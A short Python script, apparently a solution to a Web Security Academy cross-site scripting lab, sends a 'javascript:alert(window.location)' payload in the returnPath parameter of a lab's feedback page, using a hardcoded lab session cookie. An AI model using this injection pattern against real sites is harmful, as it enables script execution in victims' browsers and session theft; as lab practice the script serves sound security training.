import requests

url = "https://0ae5005303f358a4c0c073ef005e005b.web-security-academy.net/feedback"
# ?returnPath=/
cookies = {
	"session": "ReQeHU1JuSstMdBrqVvt7lPh03W8MrWT"
}

PAYLOAD = "javascript:alert(window.location)"
params = {
	"returnPath": PAYLOAD
}

r = requests.get(url, params=params, cookies=cookies)

# print(r.text)
print(r.url)